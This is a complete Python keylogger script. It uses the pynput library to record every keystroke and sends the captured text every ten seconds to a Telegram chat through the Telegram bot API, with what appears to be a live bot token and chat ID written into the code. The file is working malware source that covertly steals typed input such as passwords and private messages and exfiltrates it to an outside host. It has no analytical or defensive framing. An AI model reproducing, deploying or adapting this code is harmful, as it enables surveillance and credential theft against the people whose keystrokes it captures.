from pynput import keyboard
import requests
import threading
import time

# Replace with your actual Telegram Bot Token and Chat ID
TELEGRAM_BOT_TOKEN = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
TELEGRAM_CHAT_ID = "8298670259"

log_data = ""
log_interval = 10  # Send logs every 10 seconds
stop_event = threading.Event()

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        response.raise_for_status() # Raise an exception for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

def on_press(key):
    global log_data
    try:
        log_data += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log_data += " "
        elif key == keyboard.Key.enter:
            log_data += "[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_data = log_data[:-1] # Remove last character
        else:
            log_data += f"[{str(key)}]"

def send_logs():
    global log_data
    while not stop_event.is_set():
        if log_data:
            send_to_telegram(log_data)
            log_data = ""
        time.sleep(log_interval)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    # Start a thread to periodically send logs
    log_thread = threading.Thread(target=send_logs)
    log_thread.daemon = True # Allows the main thread to exit even if this thread is running
    log_thread.start()
    listener.join() # Keep the listener running

if __name__ == "__main__":
    start_keylogger()
